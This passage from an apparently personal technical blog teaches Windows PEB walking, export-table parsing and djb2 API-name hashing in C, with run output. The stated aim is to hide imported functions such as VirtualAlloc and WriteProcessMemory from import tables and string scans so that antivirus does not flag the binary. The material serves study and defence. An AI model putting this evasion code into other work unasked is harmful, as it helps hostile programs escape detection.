<text class="th" x="40" y="454" font-family="monospace" style="fill:#ffffff">entry_start = flink_ptr − 0x10</text>
<text class="th" x="40" y="478" font-family="monospace" style="fill:#ffffff">dll_base    = *(entry_start + 0x30)</text>
<text class="ts" x="40" y="504" style="fill:#ffffff">Subtract first to reach the top of the struct, then add the field offset.</text>
</svg>

Now let me show what actually happens when you walk from one entry to the next:

<svg width="100%" viewBox="0 0 680 540" xmlns="http://www.w3.org/2000/svg">
<defs>
<marker id="arrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
<path d="M2 1L8 5L2 9" fill="none" stroke="context-stroke" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
</marker>
<style>
.t  { font-family: sans-serif; font-size: 14px; fill: #2C2C2A; }
.ts { font-family: sans-serif; font-size: 12px; fill: #5F5E5A; }
.th { font-family: sans-serif; font-size: 14px; font-weight: 500; fill: #2C2C2A; }
</style>
</defs>

<!-- Headers (white) -->
<text class="th" x="40" y="30" style="fill:#ffffff">ntdll entry</text>
<text class="ts" x="40" y="50" style="fill:#ffffff">(struct base at some address X)</text>

<text class="th" x="420" y="30" style="fill:#ffffff">kernel32 entry</text>
<text class="ts" x="420" y="50" style="fill:#ffffff">(struct base at some address Y)</text>

<!-- ntdll entry (left side) -->
<rect x="40" y="70" width="220" height="36" rx="6" fill="#F1EFE8" stroke="#5F5E5A" stroke-width="0.5"/>
<text class="ts" x="150" y="88" text-anchor="middle" dominant-baseline="central" fill="#444441">InLoadOrderLinks</text>
<text class="ts" x="150" y="102" text-anchor="middle" dominant-baseline="central" fill="#444441">+0x00</text>

<rect x="40" y="114" width="220" height="44" rx="6" fill="#FAEEDA" stroke="#BA7517" stroke-width="1.5"/>
<text class="th" x="150" y="132" text-anchor="middle" dominant-baseline="central" fill="#412402">InMemoryOrderLinks</text>
<text class="ts" x="150" y="148" text-anchor="middle" dominant-baseline="central" fill="#633806">Flink → ●   +0x10</text>

<rect x="40" y="166" width="220" height="36" rx="6" fill="#F1EFE8" stroke="#5F5E5A" stroke-width="0.5"/>
<text class="ts" x="150" y="184" text-anchor="middle" dominant-baseline="central" fill="#444441">InInitOrderLinks  +0x20</text>

<rect x="40" y="210" width="220" height="36" rx="6" fill="#E1F5EE" stroke="#0F6E56" stroke-width="0.5"/>
<text class="th" x="150" y="228" text-anchor="middle" dominant-baseline="central" fill="#04342C">DllBase  +0x30</text>

<rect x="40" y="254" width="220" height="36" rx="6" fill="#F1EFE8" stroke="#5F5E5A" stroke-width="0.5"/>
<text class="ts" x="150" y="272" text-anchor="middle" dominant-baseline="central" fill="#444441">BaseDllName  +0x58</text>

<!-- kernel32 entry (right side) -->
<rect x="420" y="70" width="220" height="36" rx="6" fill="#F1EFE8" stroke="#5F5E5A" stroke-width="0.5"/>
<text class="ts" x="530" y="88" text-anchor="middle" dominant-baseline="central" fill="#444441">InLoadOrderLinks</text>
<text class="ts" x="530" y="102" text-anchor="middle" dominant-baseline="central" fill="#444441">+0x00</text>

<rect x="420" y="114" width="220" height="44" rx="6" fill="#FAEEDA" stroke="#BA7517" stroke-width="1.5"/>
<text class="th" x="530" y="132" text-anchor="middle" dominant-baseline="central" fill="#412402">InMemoryOrderLinks</text>
<text class="ts" x="530" y="148" text-anchor="middle" dominant-baseline="central" fill="#633806">+0x10  ← Flink lands here</text>

<rect x="420" y="166" width="220" height="36" rx="6" fill="#F1EFE8" stroke="#5F5E5A" stroke-width="0.5"/>
<text class="ts" x="530" y="184" text-anchor="middle" dominant-baseline="central" fill="#444441">InInitOrderLinks  +0x20</text>

<rect x="420" y="210" width="220" height="36" rx="6" fill="#E1F5EE" stroke="#0F6E56" stroke-width="0.5"/>
<text class="th" x="530" y="228" text-anchor="middle" dominant-baseline="central" fill="#04342C">DllBase  +0x30</text>

<rect x="420" y="254" width="220" height="36" rx="6" fill="#F1EFE8" stroke="#5F5E5A" stroke-width="0.5"/>
<text class="ts" x="530" y="272" text-anchor="middle" dominant-baseline="central" fill="#444441">BaseDllName  +0x58</text>

<!-- Arrow from left InMemoryOrderLinks to right InMemoryOrderLinks -->
<path d="M 260 136 Q 340 136 420 136" fill="none" stroke="#BA7517" stroke-width="1.5" marker-end="url(#arrow)"/>
<text class="ts" x="340" y="126" text-anchor="middle" style="fill:#ffffff">Flink points here</text>

<!-- Down arrow (moved to the LEFT of the kernel32 box so labels have clear space) -->
<path d="M 390 136 L 390 228" fill="none" stroke="#0F6E56" stroke-width="1.5" stroke-dasharray="4 3" marker-end="url(#arrow)"/>
<text class="ts" x="382" y="178" text-anchor="end" style="fill:#ffffff">subtract 0x10,</text>
<text class="ts" x="382" y="194" text-anchor="end" style="fill:#ffffff">then read +0x30</text>

<!-- Algorithm block (white) - generous spacing -->
<text class="th" x="40" y="350" style="fill:#ffffff">The algorithm:</text>
<text class="ts" x="40" y="380" style="fill:#ffffff">1. Start with Ldr -> InMemoryOrderModuleList.Flink (points into the .exe entry)</text>
<text class="ts" x="40" y="406" style="fill:#ffffff">2. entry_start = flink_ptr − 0x10   (back up to the top of the struct)</text>
<text class="ts" x="40" y="432" style="fill:#ffffff">3. Read BaseDllName at entry_start + 0x58. Compare to L"kernel32.dll".</text>
<text class="ts" x="40" y="458" style="fill:#ffffff">4. If match: read DllBase at entry_start + 0x30. Done.</text>
<text class="ts" x="40" y="484" style="fill:#ffffff">5. Otherwise: flink_ptr = *(flink_ptr)  (follow Flink, loop)</text>
</svg>
At first this looked like a paradox to me: if we already know we landed at `+0x10` (and so could just add `0x20` to reach DllBase), why bother subtracting `0x10` first to reach the top? The answer is that the pointer itself doesn't "know" which list it came from the code does, because the code is the one that chose the list. The `- 0x10` is just how we record that choice in writing. By isolating that fact in one subtraction at the top, every field access afterward uses the documented offset (`+0x30`, `+0x58`, etc.) instead of a custom delta that changes per list and per architecture. The shortcut works for a one-off grab, but the subtract-to-top pattern keeps your code matching the docs and portable across all three lists and both x86/x64.

Windows headers give you a macro for defining theses subtraction process:

```c
#define CONTAINING_RECORD(address, type, field) \
    ((type *)((char*)(address) - offsetof(type, field)))
```

So the final steps goes like this for PEB walking:

1. Read the TEB pointer from `gs:[0x30]` at x64 or `fs:[0x18]` at x86.
2. Get the PEB from TEB at offset +0x60 in x64 or +0x30 in x86.
3. Get `Ldr` from the PEB, this is the `PEB_LDR_DATA` structure.
4. Take `Ldr->InMemoryOrderModuleList` Flink. This is our starting pointer into the linked list.
5. Set `entry_start = flink_ptr - 0x10` to back up to the top of the `LDR_DATA_tABLE_ENTRY` struct.
6. Read `BaseDllName` (a UNICODE_STRING to get the actual wide-char name).
7. Compare the name to L"kernel32.dll" using a case-insensitive wide-char compare.
8. If it matches: Read `DllBase` at `entry_start + 0x30`, that is our kernel32 base address.
9. If this doesn't match: set `flink_ptr = *(flink_ptr)` (follow the next Flink) and loop back to step 5.

```cpp
#include <windows.h>
#include <stdio.h>
#include <intrin.h>   // __readgsqword
#include <wchar.h>

// Manual struct definitions (windows.h's are incomplete) 

typedef struct _UNICODE_STRING_M {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING_M;

typedef struct _PEB_LDR_DATA_M {
    ULONG      Length;
    BOOLEAN    Initialized;
    PVOID      SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA_M, *PPEB_LDR_DATA_M;

typedef struct _PEB_M {
    BYTE              Reserved1[2];
    BYTE              BeingDebugged;
    BYTE              Reserved2[1];
    PVOID             Reserved3[2];
    PPEB_LDR_DATA_M   Ldr;
    // rest doesn't matter
} PEB_M, *PPEB_M;

// LDR_DATA_TABLE_ENTRY, only the fields we need, with correct offsets on x64
typedef struct _LDR_DATA_TABLE_ENTRY_M {
    LIST_ENTRY       InLoadOrderLinks;           // +0x00
    LIST_ENTRY       InMemoryOrderLinks;         // +0x10
    LIST_ENTRY       InInitializationOrderLinks; // +0x20
    PVOID            DllBase;                    // +0x30
    PVOID            EntryPoint;                 // +0x38
    ULONG            SizeOfImage;                // +0x40 (4 bytes + 4 pad)
    UNICODE_STRING_M FullDllName;                // +0x48
    UNICODE_STRING_M BaseDllName;                // +0x58
} LDR_DATA_TABLE_ENTRY_M, *PLDR_DATA_TABLE_ENTRY_M;

// Case-insensitive wide string compare 
// Avoids importing wcsicmp / lstrcmpiW.

static int wstr_iequals(const wchar_t* a, USHORT a_bytes, const wchar_t* b) {
    USHORT a_len = a_bytes / sizeof(wchar_t);
    for (USHORT i = 0; i < a_len; i++) {
        wchar_t ca = a[i];
        wchar_t cb = b[i];
        if (cb == L'\0') return 0;
        if (ca >= L'A' && ca <= L'Z') ca += 32;
        if (cb >= L'A' && cb <= L'Z') cb += 32;
        if (ca != cb) return 0;
    }
    return b[a_len] == L'\0';
}

// PEB Walking

static PVOID GetModuleBasePEB(const wchar_t* target_name) {
    // Step 1: read TEB from gs:[0x30] (x64)
    #ifdef _WIN64
        PVOID teb = (PVOID)__readgsqword(0x30);
        // Step 2: PEB at TEB + 0x60
        PPEB_M peb = *(PPEB_M*)((BYTE*)teb + 0x60);
    #else
        PVOID teb = (PVOID)__readfsdword(0x18);
        // Step 2: PEB at TEB + 0x30
        PPEB_M peb = *(PPEB_M*)((BYTE*)teb + 0x30);
    #endif

    // Step 3: get Ldr
    PPEB_LDR_DATA_M ldr = peb->Ldr;

    // Step 4: starting Flink, head of InMemoryOrderModuleList
    PLIST_ENTRY head = &ldr->InMemoryOrderModuleList;
    PLIST_ENTRY curr = head->Flink;

    // Step 5–10: walk the list
    while (curr != head) {
        // Back up 0x10 bytes (InMemoryOrderLinks offset) to reach struct top
        PLDR_DATA_TABLE_ENTRY_M entry =
            (PLDR_DATA_TABLE_ENTRY_M)((BYTE*)curr - 0x10);

        // Step 6–7: read BaseDllName
        if (entry->BaseDllName.Buffer != NULL && entry->BaseDllName.Length > 0) {
            // Step 8: compare
            if (wstr_iequals(entry->BaseDllName.Buffer,
                             entry->BaseDllName.Length,
                             target_name)) {
                // Step 9: match → return DllBase
                return entry->DllBase;
            }
        }

        // Step 10: follow Flink
        curr = curr->Flink;
    }
    return NULL;
}

int main(void) {
    PVOID kernel32   = GetModuleBasePEB(L"kernel32.dll");
    PVOID ntdll      = GetModuleBasePEB(L"ntdll.dll");
    PVOID kernelbase = GetModuleBasePEB(L"KernelBase.dll");
    PVOID user32     = GetModuleBasePEB(L"user32.dll");
    PVOID advapi32   = GetModuleBasePEB(L"advapi32.dll");

    printf("kernel32.dll    base: %p\n", kernel32);
    printf("ntdll.dll       base: %p\n", ntdll);
    printf("KernelBase.dll  base: %p\n", kernelbase);
    printf("user32.dll      base: %p\n", user32);
    printf("advapi32.dll    base: %p\n", advapi32);

    HMODULE k32_real      = GetModuleHandleA("kernel32.dll");
    HMODULE ntdll_real    = GetModuleHandleA("ntdll.dll");
    HMODULE kbase_real    = GetModuleHandleA("KernelBase.dll");
    HMODULE user32_real   = GetModuleHandleA("user32.dll");
    HMODULE advapi32_real = GetModuleHandleA("advapi32.dll");

    printf("GetModuleHandleA kernel32:    %p  %s\n",
           (void*)k32_real,
           (k32_real == kernel32) ? "MATCH" : "MISMATCH");
    printf("GetModuleHandleA ntdll:       %p  %s\n",
           (void*)ntdll_real,
           (ntdll_real == ntdll) ? "MATCH" : "MISMATCH");
    printf("GetModuleHandleA KernelBase:  %p  %s\n",
           (void*)kbase_real,
           (kbase_real == kernelbase) ? "MATCH" : "MISMATCH");
    printf("GetModuleHandleA user32:      %p  %s\n",
           (void*)user32_real,
           (user32_real == user32) ? "MATCH" : "MISMATCH");
    printf("GetModuleHandleA advapi32:    %p  %s\n",
           (void*)advapi32_real,
           (advapi32_real == advapi32) ? "MATCH" : "MISMATCH");

    return 0;
}
```

```bash
PS C:\Users\At0m\Desktop> .\peb.exe
kernel32.dll    base: 00007ffb86250000
ntdll.dll       base: 00007ffb88150000
KernelBase.dll  base: 00007ffb85eb0000
user32.dll      base: 0000000000000000
advapi32.dll    base: 0000000000000000
GetModuleHandleA kernel32:    00007ffb86250000  MATCH
GetModuleHandleA ntdll:       00007ffb88150000  MATCH
GetModuleHandleA KernelBase:  00007ffb85eb0000  MATCH
GetModuleHandleA user32:      0000000000000000  MATCH
GetModuleHandleA advapi32:    0000000000000000  MATCH
```
# EAT + PEB Walking 

Now here is the full code for EAT + PEB walking. Chain them and we have a full replacement for `GetProcAddress(GetModuleHandleA(...), ...)` that touches zero imports.

```cpp
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <intrin.h>
#include <wchar.h>

// PEB walking structures
typedef struct _UNICODE_STRING_M {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING_M;

typedef struct _PEB_LDR_DATA_M {
    ULONG      Length;
    BOOLEAN    Initialized;
    PVOID      SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA_M, *PPEB_LDR_DATA_M;

typedef struct _PEB_M {
    BYTE              Reserved1[2];
    BYTE              BeingDebugged;
    BYTE              Reserved2[1];
    PVOID             Reserved3[2];
    PPEB_LDR_DATA_M   Ldr;
} PEB_M, *PPEB_M;

typedef struct _LDR_DATA_TABLE_ENTRY_M {
    LIST_ENTRY       InLoadOrderLinks;           // +0x00
    LIST_ENTRY       InMemoryOrderLinks;         // +0x10
    LIST_ENTRY       InInitializationOrderLinks; // +0x20
    PVOID            DllBase;                    // +0x30
    PVOID            EntryPoint;                 // +0x38
    ULONG            SizeOfImage;                // +0x40
    UNICODE_STRING_M FullDllName;                // +0x48
    UNICODE_STRING_M BaseDllName;                // +0x58
} LDR_DATA_TABLE_ENTRY_M, *PLDR_DATA_TABLE_ENTRY_M;

// Case-insensitive wide string compare (no CRT import needed)// 

static int wstr_iequals(const wchar_t* a, USHORT a_bytes, const wchar_t* b) {
    USHORT a_len = a_bytes / sizeof(wchar_t);
    for (USHORT i = 0; i < a_len; i++) {
        wchar_t ca = a[i];
        wchar_t cb = b[i];
        if (cb == L'\0') return 0;
        if (ca >= L'A' && ca <= L'Z') ca += 32;
        if (cb >= L'A' && cb <= L'Z') cb += 32;
        if (ca != cb) return 0;
    }
    return b[a_len] == L'\0';
}

// ASCII to wide conversion for forwarder DLL names
// "NTDLL.dll" -> L"NTDLL.dll"

static void ascii_to_wide(const char* src, wchar_t* dst, size_t dst_max) {
    size_t i = 0;
    while (src[i] != '\0' && i < dst_max - 1) {
        dst[i] = (wchar_t)src[i];
        i++;
    }
    dst[i] = L'\0';
}

// PEB walking: resolve a DLL base address without GetModuleHandleA

static PVOID GetModuleBasePEB(const wchar_t* target_name) {
    #ifdef _WIN64
        PVOID teb = (PVOID)__readgsqword(0x30);
        PPEB_M peb = *(PPEB_M*)((BYTE*)teb + 0x60);
    #else
        PVOID teb = (PVOID)__readfsdword(0x18);
        PPEB_M peb = *(PPEB_M*)((BYTE*)teb + 0x30);
    #endif

    PPEB_LDR_DATA_M ldr = peb->Ldr;
    PLIST_ENTRY head = &ldr->InMemoryOrderModuleList;
    PLIST_ENTRY curr = head->Flink;

    while (curr != head) {
        PLDR_DATA_TABLE_ENTRY_M entry =
            (PLDR_DATA_TABLE_ENTRY_M)((BYTE*)curr - 0x10);

        if (entry->BaseDllName.Buffer != NULL && entry->BaseDllName.Length > 0) {
            if (wstr_iequals(entry->BaseDllName.Buffer,
                             entry->BaseDllName.Length,
                             target_name)) {
                return entry->DllBase;
            }
        }
        curr = curr->Flink;
    }
    return NULL;
}

// LoadFunction: resolve any export from a DLL base
// Forwarder recursion now uses PEB walking instead of GetModuleHandleA

PVOID LoadFunction(PBYTE Module, LPSTR FunctionName)
{
    PIMAGE_NT_HEADERS       NtHeader         = NULL;
    PIMAGE_EXPORT_DIRECTORY ExpDirectory     = NULL;
    PDWORD                  AddrOfFunctions  = NULL;
    PDWORD                  AddrOfNames      = NULL;
    PWORD                   AddrOfOrdinals   = NULL;
    PVOID                   FunctionAddr     = NULL;
    LPSTR                   FoundName        = NULL;
    CHAR  LowerFoundName   [MAX_PATH]        = {0};
    CHAR  LowerFunctionName[MAX_PATH]        = {0};

    RtlSecureZeroMemory(LowerFunctionName, MAX_PATH);
    memcpy(LowerFunctionName, FunctionName, strlen(FunctionName));
    CharLowerBuffA(LowerFunctionName, strlen(FunctionName));

    NtHeader     = (PIMAGE_NT_HEADERS)(Module + ((PIMAGE_DOS_HEADER)Module)->e_lfanew);
    ExpDirectory = (PIMAGE_EXPORT_DIRECTORY)(Module + NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD ExpDirRVA  = NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    DWORD ExpDirSize = NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

    AddrOfNames     = (PDWORD)(Module + ExpDirectory->AddressOfNames);
    AddrOfFunctions = (PDWORD)(Module + ExpDirectory->AddressOfFunctions);
    AddrOfOrdinals  = (PWORD) (Module + ExpDirectory->AddressOfNameOrdinals);

    for (DWORD I = 0; I < ExpDirectory->NumberOfNames; I++)
    {
        RtlSecureZeroMemory(LowerFoundName, MAX_PATH);
        FoundName = (PCHAR)Module + AddrOfNames[I];

        memcpy(LowerFoundName, FoundName, strlen(FoundName));
        CharLowerBuffA(LowerFoundName, strlen(FoundName));

        if (!strcmp(LowerFoundName, LowerFunctionName))
        {
            DWORD FuncRva = AddrOfFunctions[AddrOfOrdinals[I]];

            // Forwarder check
            if (FuncRva >= ExpDirRVA && FuncRva < ExpDirRVA + ExpDirSize)
            {
                LPSTR Forwarder = (LPSTR)(Module + FuncRva);

                CHAR DllName [MAX_PATH] = {0};
                CHAR FuncName[MAX_PATH] = {0};

                LPSTR Dot = strchr(Forwarder, '.');
                if (!Dot) return NULL;

                size_t DllLen = Dot - Forwarder;
                memcpy(DllName, Forwarder, DllLen);
                strcpy(DllName + DllLen, ".dll");
                strcpy(FuncName, Dot + 1);

                // PEB walk replaces GetModuleHandleA here 
                wchar_t DllNameW[MAX_PATH] = {0};
                ascii_to_wide(DllName, DllNameW, MAX_PATH);

                PVOID NextModule = GetModuleBasePEB(DllNameW);
                if (!NextModule) return NULL;

                return LoadFunction((PBYTE)NextModule, FuncName);
            }

            FunctionAddr = (PVOID)(Module + FuncRva);
            return FunctionAddr;
        }
    }

    return NULL;
}

int main(void)
{
    // PEB walk for kernel32 base no API call
    PVOID k32 = GetModuleBasePEB(L"kernel32.dll");
    if (!k32) {
        printf("[-] Failed to find kernel32 via PEB walk\n");
        return 1;
    }

    printf("[+] kernel32.dll base (PEB walk): %p\n\n", k32);

    const char* targets[] = {
        "VirtualAlloc",
        "WriteProcessMemory",
        "CreateThread",
        "HeapAlloc"     // forwarder -> ntdll!RtlAllocateHeap
    };

    for (int i = 0; i < 4; i++) {
        // Verification only, GetModuleHandleA/GetProcAddress kept for comparison
        HMODULE k32_real = GetModuleHandleA("kernel32.dll");
        PVOID realVA     = (PVOID)GetProcAddress(k32_real, targets[i]);
        PVOID customVA   = LoadFunction((PBYTE)k32, (LPSTR)targets[i]);

        printf("Function: %s\n", targets[i]);
        printf("  GetProcAddress: %p\n", realVA);
        printf("  LoadFunction:   %p\n", customVA);
        printf("  Match: %s\n\n", (realVA == customVA) ? "YES" : "NO");
    }

    return 0;
}
```

Now you can check using `dumpbin /imports <filename>` you will not find any APIs in imports.
# Hash Based Resolution

The current implementation has a problme hiding in plain sight. Open the binary in any hex editor and search for `VirtualAlloc`:

![](/img/virtual.png)

There it is, sitting in `.rdata`. Every function name we resolve at runtime is still a plaintext string somewhere  in our binary because we typed it as a literal. AV doesn't even need to look at IAT, it just runs strings and flags. The fix is to never store the function name. We store the hash of it, and during the EAT we hash each export name we find and compare hashes. For picking hash algorithm anything fast and small works. `djb2` is the classic, ROR13 is one of metasploit popularized one. I will use `djb2`. This is the pseudocode:

```c
hash = 5381
for each byte c in string:
    hash = hash * 33 + c        ; equivalently: hash = (hash << 5) + hash + c
return hash
```

5381:  A prime number that, when used as an initial value, helps in ensuring a good mix of bits.

33:  The multiplier is effective at scrambling bits, leading to a good distribution of keys, though its magic is not strictly proven.

```c
#include <stdio.h>
#include <string.h>
#include <stdint.h>

// djb2 hash, classic Bernstein version
// Case-insensitive variant: lowercases A-Z before hashing
// so "VirtualAlloc" and "virtualalloc" produce the same hash.

static uint32_t djb2_hash(const char* str) {
    uint32_t hash = 5381;
    int c;
    while ((c = (unsigned char)*str++) != 0) {
        // lowercase the byte if it's A-Z
        if (c >= 'A' && c <= 'Z') c += 32;
        hash = ((hash << 5) + hash) + c;   // hash * 33 + c
    }
    return hash;
}

int main(void) {
    const char* targets[] = {
        "VirtualAlloc",
        "WriteProcessMemory",
        "CreateThread",
        "HeapAlloc",
        "LoadLibraryA",
        "GetProcAddress",
        "RtlAllocateHeap",
        "NtAllocateVirtualMemory",
        // Case-insensitivity test:
        "virtualalloc",
        "VIRTUALALLOC",
        "VirtualAlloc"
    };

    int count = sizeof(targets) / sizeof(targets[0]);

    printf("%-30s %s\n", "Function name", "djb2 hash");

    for (int i = 0; i < count; i++) {
        uint32_t h = djb2_hash(targets[i]);
        printf("%-30s 0x%08X\n", targets[i], h);
    }

    return 0;
}
```

```bash
PS C:\Users\At0m\Downloads\dumpbin-14.44.35222-x64> .\api.exe
Function name                  djb2 hash
VirtualAlloc                   0x58DACBD7
WriteProcessMemory             0x686D7128
CreateThread                   0xE819B491
HeapAlloc                      0xB1CE974E
LoadLibraryA                   0x0666395B
GetProcAddress                 0x82172F7F
RtlAllocateHeap                0x481E723A
NtAllocateVirtualMemory        0xC66D2FCC
virtualalloc                   0x58DACBD7
VIRTUALALLOC                   0x58DACBD7
VirtualAlloc                   0x58DACBD7
```

Now full code implementing it in PEB walking using `djb2` API hashing:

```c
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <intrin.h>
#include <stdint.h>
#include <inttypes.h>
#include <wchar.h>

// PEB walking structures

typedef struct _UNICODE_STRING_M {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING_M;

typedef struct _PEB_LDR_DATA_M {
    ULONG      Length;
    BOOLEAN    Initialized;
    PVOID      SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA_M, *PPEB_LDR_DATA_M;

typedef struct _PEB_M {
    BYTE             Reserved1[2];
    BYTE             BeingDebugged;
    BYTE             Reserved2[1];
    PVOID            Reserved3[2];
    PPEB_LDR_DATA_M  Ldr;
} PEB_M, *PPEB_M;

typedef struct _LDR_DATA_TABLE_ENTRY_M {
    LIST_ENTRY       InLoadOrderLinks;           // +0x00
    LIST_ENTRY       InMemoryOrderLinks;         // +0x10
    LIST_ENTRY       InInitializationOrderLinks; // +0x20
    PVOID            DllBase;                    // +0x30
    PVOID            EntryPoint;                 // +0x38
    ULONG            SizeOfImage;                // +0x40
    UNICODE_STRING_M FullDllName;                // +0x48
    UNICODE_STRING_M BaseDllName;                // +0x58
} LDR_DATA_TABLE_ENTRY_M, *PLDR_DATA_TABLE_ENTRY_M;

// djb2 hash (case-insensitive)

static uint32_t djb2_hash( const char* str )
{
    uint32_t hash = 5381;
    int c;
    while ( (c = (unsigned char)*str++) != 0 )
    {
        if ( c >= 'A' && c <= 'Z' ) c += 32;
        hash = ((hash << 5) + hash) + c;
    }
    return hash;
}

// Wide-string case-insensitive compare (no CRT import)

static int wstr_iequals( const wchar_t* a, USHORT a_bytes, const wchar_t* b )
{
    USHORT a_len = a_bytes / sizeof(wchar_t);
    for ( USHORT i = 0; i < a_len; i++ )
    {
        wchar_t ca = a[i], cb = b[i];
        if ( cb == L'\0' ) return 0;
        if ( ca >= L'A' && ca <= L'Z' ) ca += 32;
        if ( cb >= L'A' && cb <= L'Z' ) cb += 32;
        if ( ca != cb ) return 0;
    }
    return b[a_len] == L'\0';
}

// ASCII to wide (for forwarder DLL names) 

static void ascii_to_wide( const char* src, wchar_t* dst, size_t dst_max )
{
    size_t i = 0;
    while ( src[i] != '\0' && i < dst_max - 1 ) { dst[i] = (wchar_t)src[i]; i++; }
    dst[i] = L'\0';
}

// PEB walk: DLL name -> base address

static PVOID GetModuleBasePEB( const wchar_t* target_name )
{
#ifdef _WIN64
    PVOID  teb = (PVOID)__readgsqword(0x30);
    PPEB_M peb = *(PPEB_M*)((BYTE*)teb + 0x60);
#else
    PVOID  teb = (PVOID)__readfsdword(0x18);
    PPEB_M peb = *(PPEB_M*)((BYTE*)teb + 0x30);
#endif

    PPEB_LDR_DATA_M ldr  = peb->Ldr;
    PLIST_ENTRY     head = &ldr->InMemoryOrderModuleList;
    PLIST_ENTRY     curr = head->Flink;

    while ( curr != head )
    {
        PLDR_DATA_TABLE_ENTRY_M entry =
            (PLDR_DATA_TABLE_ENTRY_M)((BYTE*)curr - 0x10);

        if ( entry->BaseDllName.Buffer != NULL && entry->BaseDllName.Length > 0 )
            if ( wstr_iequals( entry->BaseDllName.Buffer,
                               entry->BaseDllName.Length,
                               target_name ) )
                return entry->DllBase;

        curr = curr->Flink;
    }
    return NULL;
}

// EAT walk: hash -> function VA, zero API calls 

PVOID LoadFunction( PBYTE Module, uint32_t FunctionHash )
{
    PIMAGE_NT_HEADERS       NtHeader        = NULL;
    PIMAGE_EXPORT_DIRECTORY ExpDirectory    = NULL;
    PDWORD                  AddrOfFunctions = NULL;
    PDWORD                  AddrOfNames     = NULL;
    PWORD                   AddrOfOrdinals  = NULL;

    NtHeader     = (PIMAGE_NT_HEADERS)( Module + ((PIMAGE_DOS_HEADER)Module)->e_lfanew );
    ExpDirectory = (PIMAGE_EXPORT_DIRECTORY)( Module +
                   NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress );

    DWORD ExpDirRVA  = NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    DWORD ExpDirSize = NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

    AddrOfNames     = (PDWORD)( Module + ExpDirectory->AddressOfNames );
    AddrOfFunctions = (PDWORD)( Module + ExpDirectory->AddressOfFunctions );
    AddrOfOrdinals  = (PWORD) ( Module + ExpDirectory->AddressOfNameOrdinals );

    for ( DWORD I = 0; I < ExpDirectory->NumberOfNames; I++ )
    {
        LPSTR ExportName = (LPSTR)( Module + AddrOfNames[I] );

        if ( djb2_hash( ExportName ) != FunctionHash )
            continue;

        DWORD FuncRva = AddrOfFunctions[ AddrOfOrdinals[I] ];

        // Forwarder check
        if ( FuncRva >= ExpDirRVA && FuncRva < ExpDirRVA + ExpDirSize )
        {
            LPSTR Forwarder = (LPSTR)( Module + FuncRva );

            CHAR DllName [MAX_PATH] = {0};
            CHAR FuncName[MAX_PATH] = {0};

            LPSTR Dot = strchr( Forwarder, '.' );
            if ( !Dot ) return NULL;

            size_t DllLen = (size_t)(Dot - Forwarder);
            memcpy( DllName, Forwarder, DllLen );
            strcpy( DllName + DllLen, ".dll" );
            strcpy( FuncName, Dot + 1 );

            wchar_t DllNameW[MAX_PATH] = {0};
            ascii_to_wide( DllName, DllNameW, MAX_PATH );

            PVOID NextModule = GetModuleBasePEB( DllNameW );
            if ( !NextModule ) return NULL;

            return LoadFunction( (PBYTE)NextModule, djb2_hash( FuncName ) );
        }

        return (PVOID)( Module + FuncRva );
    }

    return NULL;
}

// Pre-computed hashes

#define HASH_VirtualAlloc          0x58DACBD7
#define HASH_WriteProcessMemory    0x686D7128
#define HASH_CreateThread          0xE819B491
#define HASH_HeapAlloc             0xB1CE974E

int main( void )
{
    PVOID k32 = GetModuleBasePEB( L"kernel32.dll" );
    if ( !k32 ) {
        printf("[-] kernel32 not found in PEB\n");
        return 1;
    }
    printf("[+] kernel32.dll base (PEB walk): %p\n\n", k32);

    PVOID pVirtualAlloc       = LoadFunction( (PBYTE)k32, HASH_VirtualAlloc       );
    PVOID pWriteProcessMemory = LoadFunction( (PBYTE)k32, HASH_WriteProcessMemory );
    PVOID pCreateThread       = LoadFunction( (PBYTE)k32, HASH_CreateThread       );
    PVOID pHeapAlloc          = LoadFunction( (PBYTE)k32, HASH_HeapAlloc          );

    HMODULE k32_real = GetModuleHandleA("kernel32.dll");

    struct {
        const char* name;
        PVOID       ours;
        uint32_t    hash;
    } tests[] = {
        { "VirtualAlloc",       pVirtualAlloc,       HASH_VirtualAlloc       },
        { "WriteProcessMemory", pWriteProcessMemory, HASH_WriteProcessMemory },
        { "CreateThread",       pCreateThread,       HASH_CreateThread       },
        { "HeapAlloc",          pHeapAlloc,          HASH_HeapAlloc          },
    };

    for ( int i = 0; i < 4; i++ )
    {
        PVOID real = (PVOID)GetProcAddress( k32_real, tests[i].name );
        printf("Function : %s\n",           tests[i].name);
        printf("  Hash          : 0x%08" PRIx32 "\n", tests[i].hash);
        printf("  GetProcAddress: %p\n",    real);
        printf("  LoadFunction  : %p\n",    tests[i].ours);
        printf("  Match         : %s\n\n",  (real == tests[i].ours) ? "YES" : "NO");
    }

    return 0;
}
```

```powershell
PS C:\Users\At0m\Downloads\dumpbin-14.44.35222-x64> .\final.exe
[+] kernel32.dll base (PEB walk): 00007ffb86250000

Function : VirtualAlloc
  Hash          : 0x58dacbd7
  GetProcAddress: 00007ffb86268c90
  LoadFunction  : 00007ffb86268c90
  Match         : YES

